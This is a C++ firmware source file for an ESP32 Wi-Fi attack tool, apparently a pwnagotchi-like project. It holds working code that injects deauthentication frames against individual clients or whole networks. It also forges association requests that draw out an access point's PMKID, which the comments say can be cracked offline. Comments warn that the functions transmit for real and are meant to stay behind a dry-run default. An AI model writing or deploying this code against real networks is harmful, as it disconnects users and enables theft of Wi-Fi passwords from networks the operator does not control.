// ESP32 radio backend for the SmartCap adapter, used ONLY when the adapter is
// switched out of dry-run. This file must not be compiled on hosts; the
// firmware build includes it, smartcap_radio.cpp core does not.
//
// DANGER WINDOW (see also include/smartcap_radio.h): every function here
// really talks to the air when invoked. Keep them unreachable while
// SMCAP_RADIO_DEFAULT_DRY_RUN = 1.

#include "smartcap_radio.h"

#include "pentagotchi_internal.h"

#include <esp_err.h>
#include <esp_wifi.h>
#include <string.h>

using namespace pentagotchi::detail;

extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, const void *buffer, int len);
extern "C" esp_err_t esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len,
                                       bool en_sys_seq);

namespace {

bool espGetChannel(uint8_t *out) {
    if (!out) {
        return false;
    }
    *out = readWifiChannel();
    return true;
}

bool espSetChannel(uint8_t channel) {
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) == ESP_OK;
}

// Build a management deauthentication frame addressed at `dest` (a client MAC
// or the broadcast) and send it a couple of times.
void espSendDeauth(const uint8_t *dest, const uint8_t *ap) {
    uint8_t frame[sizeof(kDeauthFrameTemplate)];
    memcpy(frame, kDeauthFrameTemplate, sizeof(kDeauthFrameTemplate));
    memcpy(frame + 4, dest, 6);   // dest
    memcpy(frame + 10, ap, 6);    // source
    memcpy(frame + 16, ap, 6);    // bssid

    for (int i = 0; i < 2; ++i) {
        esp_err_t err = esp_wifi_internal_tx(WIFI_IF_STA, frame, sizeof(frame));
        if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        }
        if (err != ESP_OK) {
            ESP_LOGW(kLogTag, "smartcap deauth tx failed: %s", esp_err_to_name(err));
        }
    }
}

void espDeauthClient(const uint8_t *ap, const uint8_t *client) {
    espSendDeauth(client, ap);
}

void espDeauthBcast(const uint8_t *ap) {
    static const uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    espSendDeauth(bcast, ap);
}

// Build an association request that asks the AP for a PMKID and inject it. The
// request carries a WPA2/PSK RSN IE with the RSN "PMKID capabilities" bit set
// and a dummy (all-zero) PMKID list; an AP that supports the silent method
// answers with an association response whose RSN IE contains the real PMKID it
// derives for our (fake, locally-administered) station, which the RX parser
// turns into SMCAP_EV_PMKID_SEEN. The capture is crackable offline because the
// PMKID binds (PMK, AP-MAC, station-MAC) and we know all three.
void espAssocPmkid(const uint8_t *ap, const char *ssid) {
    // Locally-administered station MAC, re-derived from the AP so separate
    // targets get distinct, reproducible identities without any real state.
    uint8_t sta[6];
    memcpy(sta, ap, 6);
    sta[0] |= 0x02;
    sta[5] ^= 0xBA;

    uint8_t frame[160];
    memset(frame, 0, sizeof(frame));

    // Management association request: type 0, subtype 0.
    frame[0] = 0x00; frame[1] = 0x00;

    // Order: adjacent to the DS = destination; we go to the DS, so addr1 =
    // AP (read from the BSSID field, addr3, as the observer sees it).
    memcpy(frame + 4, ap, 6);   // DA = AP
    memcpy(frame + 10, sta, 6); // SA = our station
    memcpy(frame + 16, ap, 6);  // BSSID = the target AP

    // Capability + listen interval: ESS, no short preamble etc., we don't care
    // about the exact values, the AP must just treat this as legal.
    frame[24] = 0x01; frame[25] = 0x00;
    frame[26] = 0x00; frame[27] = 0x00;

    size_t pos = 28;
    if (ssid && ssid[0]) { // SSID IE
        size_t sl = strlen((const char *)ssid);
        if (sl > 32) sl = 32;
        frame[pos++] = 0;
        frame[pos++] = (uint8_t)sl;
        memcpy(frame + pos, ssid, sl);
        pos += sl;
    } else { // wildcard for hidden-SSID networks
        frame[pos++] = 0;
        frame[pos++] = 0;
    }

    // Supported rates IE
    static const uint8_t kRates[8] = {0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24};
    frame[pos++] = 1;
    frame[pos++] = (uint8_t)sizeof(kRates);
    memcpy(frame + pos, kRates, sizeof(kRates));
    pos += sizeof(kRates);

    // RSN IE (tag 48): WPA2/PSK with the PMKID capability bit set (0x80) and a
    // one-entry PMKID list (dummy bytes; the AP answers with the real value).
    const uint8_t rsn[] = {
        0x01, 0x00,             // version
        0x00, 0x0f, 0xac, 0x04, // group cipher: CCMP
        0x01, 0x00,             // pairwise suite count
        0x00, 0x0f, 0xac, 0x04, // pairwise: CCMP
        0x01, 0x00,             // akm suite count
        0x00, 0x0f, 0xac, 0x02, // akm: PSK
        0x80, 0x00,             // capabilities: PMKID capable
        0x01, 0x00,             // pmkid count
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // placeholder PMKID
    };
    frame[pos++] = 48;
    frame[pos++] = (uint8_t)sizeof(rsn);
    memcpy(frame + pos, rsn, sizeof(rsn));
    pos += sizeof(rsn);

    for (int i = 0; i < 2; ++i) {
        esp_err_t err = esp_wifi_internal_tx(WIFI_IF_STA, frame, (int)pos);
        if (err == ESP_ERR_NOT_SUPPORTED || err == ESP_ERR_INVALID_ARG) {
            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)pos, false);
        }
        if (err != ESP_OK) {
            ESP_LOGW(kLogTag, "smartcap assoc-pmkid tx failed: %s", esp_err_to_name(err));
        }
    }
}

} // namespace

const smartcap_radio_ops_t *smartcap_radio_esp_ops(void) {
    static const smartcap_radio_ops_t ops = {
        .get_channel = espGetChannel,
        .set_channel = espSetChannel,
        .deauth_client = espDeauthClient,
        .deauth_bcast = espDeauthBcast,
        .assoc_pmkid = espAssocPmkid,
    };
    return &ops;
}